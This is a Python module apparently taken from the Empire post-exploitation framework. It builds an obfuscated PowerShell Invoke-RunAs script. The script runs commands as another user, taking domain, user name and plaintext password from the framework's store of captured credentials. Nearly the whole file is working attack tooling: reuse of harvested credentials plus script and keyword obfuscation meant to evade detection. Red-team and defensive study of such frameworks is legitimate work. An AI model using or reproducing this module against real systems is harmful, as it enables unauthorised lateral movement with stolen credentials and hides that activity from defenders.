from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
                 obfuscation_command: str = ""):
        module_source = main_menu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        script = f.read()
        f.close()

        script_end = "\nInvoke-RunAs "

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":

            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (cred_id, cred_type, domain_name, user_name, password, host, os, sid, notes) = \
            main_menu.credentials.get_credentials(cred_id)[0]

            if cred_type != "plaintext":
                print(helpers.color("[!] A CredID with a plaintext password must be used!"))
                return ""

            if domain_name != "":
                params["Domain"] = domain_name
            if user_name != "":
                params["UserName"] = user_name
            if password != "":
                params["Password"] = "'" + password + "'"

        if params["Domain"] == "" or params["UserName"] == "" or params["Password"] == "":
            print(helpers.color("[!] Domain/UserName/Password or CredID required!"))
            return ""

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "credid":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    else:
                        script_end += " -" + str(option) + " '" + str(values) + "'"

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end,
                                           obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
